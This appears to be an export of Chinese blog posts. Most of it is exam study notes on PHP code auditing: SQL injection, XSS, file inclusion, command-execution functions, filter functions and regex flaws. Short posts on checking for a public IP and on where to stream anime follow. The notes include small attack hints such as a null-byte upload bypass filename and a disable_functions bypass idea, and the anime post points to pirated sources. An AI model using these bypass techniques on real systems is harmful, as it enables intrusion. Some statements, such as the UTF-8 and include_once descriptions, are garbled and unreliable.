<h2 id="第11题-1"><a href="#第11题-1" class="headerlink" title="第11题"></a>第11题</h2><p>通常文件和数据库备份功能容易出现的安全问题包括：</p>
<ol>
<li>备份文件名可预测</li>
<li>未授权访问和越权访问</li>
<li>可以直接执行SQL语句进行操作</li>
</ol>
<h2 id="第12题-1"><a href="#第12题-1" class="headerlink" title="第12题"></a>第12题</h2><p>密码策略应当遵守的原则：</p>
<ol>
<li>禁止使用弱口令</li>
<li>禁止用户名和密码相同</li>
<li>强制密码使用8位以上的“大小写字母+数字+特殊字符”的组合</li>
</ol>
<h2 id="第13题-1"><a href="#第13题-1" class="headerlink" title="第13题"></a>第13题</h2><p>双因素认证是一种采用时间同步技术的系统，每次产生的动态密码不同。<br>独立密码是区别于登陆密码的二次加密保护，大多时候不能进行登录保护<br>实现登录保护的策略：双因素认证，动态令牌，限制登录IP</p>
<h2 id="第14题-1"><a href="#第14题-1" class="headerlink" title="第14题"></a>第14题</h2><p>用户注册有以下几个安全思路：<br>1）设计验证码。2）采集用户机器唯一识别码，拦截短时间多次注册。3）根据账号格式自学习识别垃圾账号。4）防止SQL注入漏洞与XSS漏洞</p>
<h2 id="第15题-1"><a href="#第15题-1" class="headerlink" title="第15题"></a>第15题</h2><p>多因素认证的方式有如下几种：</p>
<ol>
<li>手机短信&#x2F;语音验证码</li>
<li>手机App动态令牌</li>
<li>邮箱验证码</li>
<li>实体令牌卡</li>
<li>电子图片令牌卡</li>
<li>硬件令牌</li>
</ol>
<h2 id="第21题-1"><a href="#第21题-1" class="headerlink" title="第21题"></a>第21题</h2><p>代码审计是对应用程序源代码进行检查，目的是为了找到并且修复应用程序在开发阶段存在的一些漏洞或者程序逻辑错误，避免程序漏洞被非法利用。</p>
<h2 id="第22题-1"><a href="#第22题-1" class="headerlink" title="第22题"></a>第22题</h2><p>文件操作漏洞中的文件包含又分为本地文件包含和远程文件包含。</p>
<h2 id="第23题-1"><a href="#第23题-1" class="headerlink" title="第23题"></a>第23题</h2><p>代码执行漏洞是指应用程序本身过滤不严。</p>
<h2 id="第24题-1"><a href="#第24题-1" class="headerlink" title="第24题"></a>第24题</h2><p>SQL注入过滤函数有addslashes()函数，mysql_real_escape_string()函数，mysql_escape_string()函数。XSS过滤函数有htmlspecialchars()和strip_tags()。</p>
<h2 id="第25题-1"><a href="#第25题-1" class="headerlink" title="第25题"></a>第25题</h2><p>加密是指将明文以特定的方式进行混淆，直接可见的数据以特定的算法进行混淆。</p>
<h2 id="第26题-1"><a href="#第26题-1" class="headerlink" title="第26题"></a>第26题</h2><p>一个网站的应用安全防御应该包括对输入的特殊字符过滤、输出过滤、异常访问检测、自身安全检测，等等。</p>
<h2 id="第27题"><a href="#第27题" class="headerlink" title="第27题"></a>第27题</h2><p>自身安全检测方式有：木马查杀、弱后台地址检测、弱口令检测，等等。</p>
<h2 id="第28题"><a href="#第28题" class="headerlink" title="第28题"></a>第28题</h2><p>将数据复制到不足以容纳数据的缓冲区，会导致缓冲区溢出。</p>
<h2 id="第29题"><a href="#第29题" class="headerlink" title="第29题"></a>第29题</h2><p>UTF-8是一个8位字符集，它可以表示Unicode字符集中的每个字符，而且与美国7位ASCII字符集向后兼容。每个UTF-8字符由1~4个字符表示。</p>
<h2 id="第30题"><a href="#第30题" class="headerlink" title="第30题"></a>第30题</h2><p>在C和C++中，操作字符串最常见的错误有4种，分别是无界字符串复制(unbounded string copy)、差一错误(off-by-one error)、空结尾错误(null termination error)以及字符串截断(string truncation)。</p>
<h2 id="第31题"><a href="#第31题" class="headerlink" title="第31题"></a>第31题</h2><p>测试包括：白盒测试，黑盒测试，灰盒测试。<br>黑盒测试又叫功能测试，是指在不接触代码的情况下，测试系统的功能是否存在bug，是否满足设计需求。<br>而白盒测试就是我们说的代码审计，以开放的形式从代码层面寻找bug，如果发现有bug则返回修复，直到没有bug才允许软件发布上线</p>
<h2 id="第32题"><a href="#第32题" class="headerlink" title="第32题"></a>第32题</h2><p>magic_quotes_gpc负责对GET,POST,COOKIE的值进行过滤。</p>
<h2 id="第33题"><a href="#第33题" class="headerlink" title="第33题"></a>第33题</h2><p>反射型XSS是非持久性，参数型的跨站脚本。是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。<br>存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数(变量)中，而是写入数据库或文件等可以永久保存的介质中。</p>
<h2 id="第34题"><a href="#第34题" class="headerlink" title="第34题"></a>第34题</h2><p>include() 			文件包含过程中出现错误，抛出警告，之后继续正常执行<br>include_once() 		与require()函数相同，但文件只包含第一次<br>require() 			文件包含过程中出现错误，抛出错误，退出程序执行<br>require_once() 		与include()函数相同，但文件只包含第一次<br>highlight_file()    打印输出或者返回 filename 文件中语法高亮版本的代码</p>
<h2 id="第35题"><a href="#第35题" class="headerlink" title="第35题"></a>第35题</h2><p><code>system()</code> 执行系统命令，输出执行结果<br><code>exec()</code> 执行系统命令，不输出结果，返回执行结果数组<br><code>passthru()</code> 执行系统命令，输出执行结果（支持二进制）<br><code>shell_exec()</code> 执行系统命令，不输出结果，返回执行结果字符串<br><code>popen()</code> 执行系统命令，不输出结果，返回一个资源类型<br>反引号（`）执行系统命令，不输出结果，返回执行结果字符串</p>
<h2 id="第36题"><a href="#第36题" class="headerlink" title="第36题"></a>第36题</h2><p>非对称加密与对称加密不一样的地方在于，非对称加密算法有两个密钥，分别为公钥和私钥，它的安全性比对称加密更好，公钥用来加密，私钥用来解密。</p>
<h2 id="第37题"><a href="#第37题" class="headerlink" title="第37题"></a>第37题</h2><p>文件上传漏洞大多出现在可以进行文件上传的地方，如用户头像上传，文档上传处等。</p>
<h2 id="第38题"><a href="#第38题" class="headerlink" title="第38题"></a>第38题</h2><p>eval()和assert()函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致</p>
<h2 id="第39题"><a href="#第39题" class="headerlink" title="第39题"></a>第39题</h2><h3 id="escapeshellcmd-函数"><a href="#escapeshellcmd-函数" class="headerlink" title="escapeshellcmd()函数"></a>escapeshellcmd()函数</h3><p>shell元字符转义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。escapeshellcmd() 应被用在完整的命令字符串上。escapeshellcmd() 不会对空格转义。</p>
<ul>
<li>参数<br>command，要转义的命令</li>
<li>返回值<br>转义后的字符串</li>
</ul>
<h2 id="第42题"><a href="#第42题" class="headerlink" title="第42题"></a>第42题</h2><p>常见的Web漏洞：</p>
<ol>
<li>SQL注入漏洞</li>
<li>XSS漏洞</li>
<li>CSRF漏洞</li>
<li>文件操作漏洞</li>
<li>代码执行漏洞</li>
<li>命令执行漏洞</li>
<li>变量覆盖漏洞</li>
<li>逻辑处理漏洞</li>
<li>会话认证漏洞</li>
</ol>
<h2 id="第43题"><a href="#第43题" class="headerlink" title="第43题"></a>第43题</h2><p>SQL注入漏洞的主要利用方式：</p>
<ol>
<li>宽字节注入</li>
<li>二次urlencode注入</li>
<li>联合注入</li>
<li>布尔盲注</li>
<li>时间盲注</li>
<li>堆叠注入</li>
</ol>
<h2 id="第44题"><a href="#第44题" class="headerlink" title="第44题"></a>第44题</h2><p><img src="/simg/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="二次漏洞攻击流程图"></p>
<h1 id="第3套试题"><a href="#第3套试题" class="headerlink" title="第3套试题"></a>第3套试题</h1><h2 id="第1题-2"><a href="#第1题-2" class="headerlink" title="第1题"></a>第1题</h2><p>PHP_INI_USER	可在用户脚本（例如ini_set()或Windows注册表以及.user.ini中设定）<br>PHP_INI_PERDIR	可在 php.ini，.htaccess 或 httpd.conf 中设定<br>PHP_INI_SYSTEM	可在 php.ini 或 httpd.conf 中设定<br>PHP_INI_ALL		可在任何地方设定</p>
<h2 id="第5题-2"><a href="#第5题-2" class="headerlink" title="第5题"></a>第5题</h2><p>allow_url_include &#x3D; Off (禁止引用URL文件,新版增加功能,预设关闭)<br>allow_url_include &#x3D; On (允许引用URL文件,新版增加功能)<br>远程文件包含需要设置为on</p>
<p>绝大多数的文件包含都需要配合截断进行,因为我们不能写入以.php为拓展名的文件</p>
<p>当被包含的文件在服务器本地时，称为本地文件包含。<br>当被包含的文件在第三方服务器时，称为远程文件包含。</p>
<h2 id="第7题-2"><a href="#第7题-2" class="headerlink" title="第7题"></a>第7题</h2><p>正则表达式中的点号(.)匹配除换行符(\n)之外的任意一个字符。</p>
<h2 id="第8题-2"><a href="#第8题-2" class="headerlink" title="第8题"></a>第8题</h2><p>PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致</p>
<h3 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open()函数"></a>proc_open()函数</h3><p>执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span>(</span><br><span class="line">    <span class="keyword">array</span>|<span class="keyword">string</span> <span class="variable">$command</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptor_spec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$env_vars</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数<br>command<br>以string形式执行的命令行。<br>descriptor_spec<br>一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。<br>pipes<br>将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</li>
<li>返回值<br>返回表示进程的资源类型，当使用完毕之后，请调用 proc_close() 函数来关闭此资源。 如果失败，返回 false。</li>
</ul>
<h2 id="第15题-2"><a href="#第15题-2" class="headerlink" title="第15题"></a>第15题</h2><p>安全的API登录需求：</p>
<ol>
<li>登录密钥不可预测并且不固定，生成key的算法中加入随机字符</li>
<li>API接口禁止搜索引擎收录</li>
<li>登录密钥绑定当前主机，换机器不可用</li>
</ol>
<h2 id="第16题-1"><a href="#第16题-1" class="headerlink" title="第16题"></a>第16题</h2><p>针对撞库漏洞比较好的解决方案是 使用登录验证码和多因素验证。</p>
<h2 id="第17题-1"><a href="#第17题-1" class="headerlink" title="第17题"></a>第17题</h2><p>cookie 是访问过的网站创建的文件，用于存储浏览信息，例如个人资料信息。<br>Opera允许cookie多达4096个字节，包括：名（name）、值（value）和等号。 Internet Explorer允许cookie多达4095个字节，包括：名（name）、值（value）和等号。 注：多字节字符计算为两个字节。 在所有浏览器中，任何cookie大小超过限制都被忽略，且永远不会被设置。<br>cookie 有两种清除方式：<br>通过浏览器工具清除 cookie (有第三方的工具，浏览器自身也有这种功能)<br>通过设置 cookie 的有效期来清除 cookie</p>
<h2 id="第21题-2"><a href="#第21题-2" class="headerlink" title="第21题"></a>第21题</h2><p>Fortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。</p>
<h2 id="第26题-2"><a href="#第26题-2" class="headerlink" title="第26题"></a>第26题</h2><p>攻击者可以利用eval()函数来加载自定义的PHP扩展以突破disable_functions指令的限制</p>
<h2 id="第27题-1"><a href="#第27题-1" class="headerlink" title="第27题"></a>第27题</h2><p>安全过滤文件：通常文件名中包含 filter 、 safe 、 check 等关键字，这类文件主要是对参数进行过滤，关系到我们找到的可疑点能否利用。</p>
<h2 id="第31题-1"><a href="#第31题-1" class="headerlink" title="第31题"></a>第31题</h2><p>代码审计思路中，根据敏感函数回溯参数过程<br>优点：<br>只需搜索相应敏感关键字，即可以快速地挖掘想要的漏洞，具有可定向挖掘和高效、高质量的优点。<br>缺点：<br>挖掘漏洞时定位利用点会花费一些时间，另外对逻辑漏洞挖掘覆盖不到。</p>
<h2 id="第32题-1"><a href="#第32题-1" class="headerlink" title="第32题"></a>第32题</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>代码的作用是判断“install.lock”文件是否存在且变量action是否不等于upgrade和installed。如果三个条件均满足，则使用header()函数跳转到首页。</p>
<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>问题出在使用header()函数跳转，PHP程序没有退出，仍然会进入安装流程。利用方式是通过GET或POST的方式接收将要跳转的URL，然后通过构造恶意链接进行提交来跳转到目标URL。</p>
<h2 id="第34题-1"><a href="#第34题-1" class="headerlink" title="第34题"></a>第34题</h2><p>preg_match里的正则表达式仅限制了必须输出4个数字，但没有要求4个数字在什么位置输出。缺少了限制首尾，仅能输出4个数字的正则。严谨的写法应该为: <code>^\d+\.\d+\.\d+\.\d+$</code></p>
<h2 id="第35题-1"><a href="#第35题-1" class="headerlink" title="第35题"></a>第35题</h2><h3 id="问题1-1"><a href="#问题1-1" class="headerlink" title="问题1"></a>问题1</h3><p><code>if(!get_magic_quotes_gpc())</code> 的判断条件是如果magic_quotes_gpc&#x3D;on,则函数返回true，if语句为false不执行。如果magic_quotes_gpc&#x3D;off,则函数返回false，if语句为true执行。</p>
<h3 id="问题2-1"><a href="#问题2-1" class="headerlink" title="问题2"></a>问题2</h3><p><code>if(is_array($var))</code> 的作用是判断参数var是否为数组，如果为数组则执行if语句，否则不执行。<br><code>foreach</code> 语句的作用是对数组内每个值递归调用函数，防止未进行addslashes过滤。</p>
<h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p>如果变量var小于等于0或变量里具有cfg_,GLOBALS,_GET,_POST,_COOKIE的其中之一则执行exit函数。</p>
<h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p>addslashes()函数的作用是对 <code>&#39;  &quot;  \  null字符</code> 添加反斜杠（\）来转义。过滤掉危险字符。</p>
<h1 id="第4套试题"><a href="#第4套试题" class="headerlink" title="第4套试题"></a>第4套试题</h1><h2 id="第2题-2"><a href="#第2题-2" class="headerlink" title="第2题"></a>第2题</h2><h3 id="safe-mode"><a href="#safe-mode" class="headerlink" title="safe_mode"></a>safe_mode</h3><p>在Safe mode下无法使用的函数有shell_exec()，exec()，system()，passthru()，popen()等。<br><a href="http://php.adamharvey.name/manual/zh/features.safe-mode.functions.php">Safe mode下不能使用的函数</a></p>
<h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>open_basedir加载外部脚本时，多个目录以冒号(:)分割</p>
<h3 id="display-errors"><a href="#display-errors" class="headerlink" title="display_errors"></a>display_errors</h3><p>配置error_reporting时，需要开启display_errors&#x3D;on</p>
<h2 id="第3题-2"><a href="#第3题-2" class="headerlink" title="第3题"></a>第3题</h2><p>浏览器扩展工具：Hackbar, Firebug, Modify</p>
<h2 id="第5题-3"><a href="#第5题-3" class="headerlink" title="第5题"></a>第5题</h2><h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><p>作用是变量覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span> ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。如果传入的字符串的键名是数组里没有的变量则会创建一个新的变量并赋值给它。如果是已有的变量但值不同，则字符串的键值会覆盖原来的值。</p>
<h2 id="第6题-2"><a href="#第6题-2" class="headerlink" title="第6题"></a>第6题</h2><p>抽奖和投票漏洞有以下几种利用方法：</p>
<ol>
<li>cookie或POST请求正文绕过</li>
<li>基于IP验证</li>
<li>基于用户认证</li>
</ol>
<h2 id="第7题-3"><a href="#第7题-3" class="headerlink" title="第7题"></a>第7题</h2><p>文件包含漏洞大多出现在模块加载，模板加载和cache调用的地方</p>
<h2 id="第9题-2"><a href="#第9题-2" class="headerlink" title="第9题"></a>第9题</h2><h3 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h3><p>为数组的每个元素应用回调函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<p>array_map() 返回一个 array，包含将 array 的相应值作为回调的参数顺序调用 callback 后的结果（如果提供了更多数组，还会利用 arrays 传入）。callback 函数形参的数量必须匹配 array_map() 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 ArgumentCountError。<br><a href="https://www.php.net/manual/zh/function.array-map.php">array_map</a></p>
<h2 id="第10题-2"><a href="#第10题-2" class="headerlink" title="第10题"></a>第10题</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>\w  匹配字母、数字、下划线。等价于 [A-Za-z0-9_]<br>正则表达式修饰符 i、g、m、s、U、x、a、D、e 等。<br>i  不区分大小写<br>g  全局匹配<br>m  多行匹配<br>e  配合函数preg_replace()使用，可以把匹配来的字符串当正则表达式执行</p>
<h2 id="第17题-2"><a href="#第17题-2" class="headerlink" title="第17题"></a>第17题</h2><p>php:&#x2F;&#x2F;input是php语言中一个只读的数据流；通过”php:&#x2F;&#x2F;input”，可以读取从Http客户端以POST方式提交、请求头“Content-Type”值非”multipart&#x2F;form-data”的所有数据<br>multipart&#x2F;form-data的基础方式是post</p>
<h2 id="第19题-1"><a href="#第19题-1" class="headerlink" title="第19题"></a>第19题</h2><p>HTML实体编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;   &amp;amp; 或 &amp;#38;</span><br><span class="line">&quot;   &amp;quot; 或 &amp;#34;</span><br><span class="line">&#x27;   &amp;apos; 或 &amp;#39;</span><br><span class="line">&gt;  &amp;gt; 或 &amp;#62;</span><br></pre></td></tr></table></figure>

<h2 id="第22题-2"><a href="#第22题-2" class="headerlink" title="第22题"></a>第22题</h2><p>BugFree3.0.2重装漏洞是因为仅仅使用了header(),并没有使用die()或者exit()等函数退出程序流程，这个跳转只是HTTP头的跳转，下方代码依然会继续执行.</p>
<h2 id="第28题-1"><a href="#第28题-1" class="headerlink" title="第28题"></a>第28题</h2><p>验证码不刷新直接绕过的原因是后端程序在接受一次请求后，并没有主动刷新验证码。</p>
<h2 id="第30题-1"><a href="#第30题-1" class="headerlink" title="第30题"></a>第30题</h2><p>CSRF主要是用于越权操作。</p>
<h2 id="第33题-1"><a href="#第33题-1" class="headerlink" title="第33题"></a>第33题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">\0\&#x27;</span><br><span class="line">\\&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="第34题-2"><a href="#第34题-2" class="headerlink" title="第34题"></a>第34题</h2><p>安全问题：<br>正则表达式里面扩展名前面的点(.)没有进行转义，导致变成了全匹配符。如果这时候提交的文件名为’xxx.php%00jpg’,则会绕过检查并写入一个PHP文件。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>期末专题</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>期末</tag>
      </tags>
  </entry>
  <entry>
    <title>判断一个IP是否为公网IP</title>
    <url>/2023/03/11/%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAIP%E6%98%AF%E5%90%A6%E4%B8%BA%E5%85%AC%E7%BD%91IP/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时需要一个公网ip，但是不知道自己的IP是否为公网IP，由于老是会忘掉怎么判断，不如自己记录一下。</p>
<span id="more"></span>
<h1 id="IP之间的区别"><a href="#IP之间的区别" class="headerlink" title="IP之间的区别"></a>IP之间的区别</h1><p>内网IP：只能在限定区域内访问，外网无法识别。<br>大内网IP：假设是联通带宽，则分配IP只能在联通内访问，移动电信网络均无法访问。<br>公网IP：全球唯一IP地址，在任何地方均可访问。</p>
<h1 id="Tips-1-IP地址范围"><a href="#Tips-1-IP地址范围" class="headerlink" title="Tips 1:IP地址范围"></a>Tips 1:IP地址范围</h1><p>以下IP段范围均为私网IP地址：</p>
<ol>
<li>10.0.0.0-10.255.255.255</li>
<li>192.168.0.0-192.168.255.255</li>
<li>172.16.0.0-172.31.255.255</li>
</ol>
<h1 id="Tips-2-咨询网络服务商"><a href="#Tips-2-咨询网络服务商" class="headerlink" title="Tips 2:咨询网络服务商"></a>Tips 2:咨询网络服务商</h1><p>如果不确定自身IP是否为公网IP，那么可以咨询客服。<br>如果确定不是公网IP，那么向客服要求开通公网IP。</p>
<h1 id="Tips-3-IP对比法"><a href="#Tips-3-IP对比法" class="headerlink" title="Tips 3:IP对比法"></a>Tips 3:IP对比法</h1><p>首先查看自身IP：使用cmd的ipconfig&#x2F;all命令，查看正在连接的ipv4地址。<br>然后在<a href="https://www.whatismyip.com/">whatismyip</a> 或 <a href="https://www.ipchicken.com/">ipchicken</a> 查看IP，比对是否一致。<br>如果一致，则说明IP为公网ip，否则不是。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>物以稀为贵，公网IP更好，但也要看自身需求。</p>
]]></content>
      <categories>
        <category>IP</category>
      </categories>
      <tags>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title>如何寻觅动画</title>
    <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
    <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p>
<h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol>
<li><strong>bilibili港澳台区</strong><br>优点：</li>
</ol>
<ul>
<li>资源比较多，不用到处找</li>
<li>有弹幕和评论区，有分享的地方</li>
<li>除了独家代理，其它都可以免费观看<br>缺点：</li>
<li>在1080p资源中画质算是比较差的，压缩比较大</li>
<li>字幕样式比较丑，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br>如果能用大陆代理，老番资源还是比较多的，无删改的可以看看，由于经常搞活动，会员价很便宜。<br>(活动)会员价：8刀&#x2F;年<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p>
<ol start="2">
<li><strong>巴哈姆特动画疯</strong><br>优点：</li>
</ol>
<ul>
<li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li>
<li>资源比较多，不用到处找</li>
<li>有弹幕，可以分享</li>
<li>相较于bilibili港澳台大部分画质更佳</li>
<li>很多时候op，ed歌词都有翻译<br>缺点：</li>
<li>会员费较贵</li>
<li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li>
<li>有时字幕过大，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br>会员价：36刀&#x2F;年。新年买半年或一年可以加送1个月<br><a href="https://ani.gamer.com.tw/">动画疯</a></p>
<ol start="3">
<li><strong>Netflix</strong><br>优点：</li>
</ol>
<ul>
<li>画质好，没得说</li>
<li>资源也比较多</li>
<li>有自制动画。如：恶魔人，赛博朋克</li>
<li>可以跳过op和ed<br>缺点：</li>
<li>新番资源少</li>
<li>对代理的要求比较高</li>
</ul>
<p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br>(合租)会员价：27刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.netflix.com/">Netflix</a></p>
<ol start="4">
<li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li>
</ol>
<p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br>(合租)会员价：13刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.disneyplus.com/">Disney+</a></p>
<ol start="5">
<li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li>
</ol>
<p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p>
<ol start="6">
<li><strong>YouTube</strong></li>
</ol>
<ul>
<li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p>
<p>还没有看过<strong>神之动画</strong>的快来看！</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p>
<ul>
<li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p>
<ol start="7">
<li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p>
<ol start="8">
<li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li>
</ol>
<p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p>
<h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol>
<li><strong>Telegram</strong></li>
</ol>
<ul>
<li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li>
</ul>
<p><a href="https://t.me/AnimeNep">NEP.Anime</a></p>
<ul>
<li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li>
</ul>
<p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p>
<ul>
<li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li>
</ul>
<p><a href="https://t.me/channel_ani">ANI</a></p>
<p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p>
<ol start="2">
<li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p>
<p><a href="https://www.agemys.net/">AGE</a></p>
<ol start="3">
<li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li>
</ol>
<p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧，也算是为动画行业添砖加瓦。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)<br>注意本文的时效性：2022.11，后续有任何改变并不知晓。</p>
]]></content>
      <categories>
        <category>动画</category>
        <category>资源</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>资源</tag>
      </tags>
  </entry>
  <entry>
